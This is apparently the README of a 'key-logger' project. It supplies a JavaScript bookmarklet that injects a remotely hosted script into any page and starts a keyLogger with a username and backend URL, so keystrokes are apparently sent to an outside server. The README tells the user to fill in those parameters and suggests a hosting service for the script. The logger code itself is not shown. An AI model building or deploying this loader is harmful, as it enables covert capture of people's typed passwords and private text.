# key-logger

## Bookmarklet

- Source
    ```javascript
    javascript:(function(d, s) {
        username = '';
        backend_url = '';
        script_url = '';
        s = d.createElement('script'); 
        s.type = 'text/javascript'; 
        s.onload = function(){ window.keyLogger.fn.init(username, backend_url) };
        s.src = script_url + '?v=' + String(new Date() * 1);
        d.getElementsByTagName('head')[0].appendChild(s);
    }(document, window));
    ```
- Url for bookmark 
    - **DON'T FORGET TO CHANGE PARAMS**
        - username
        - backend url
        - script url
            - [rawgit.com](http://rawgit.com/) can be used to obtain script url
    
    ```
    javascript:(function(d, s) {username = '';backend_url = '';script_url = '';s = d.createElement('script'); s.type = 'text/javascript'; s.onload = function(){ window.keyLogger.fn.init(username, backend_url) };s.src = script_url + '?v=' + String(new Date() * 1);d.getElementsByTagName('head')[0].appendChild(s);}(document, window));
    ```
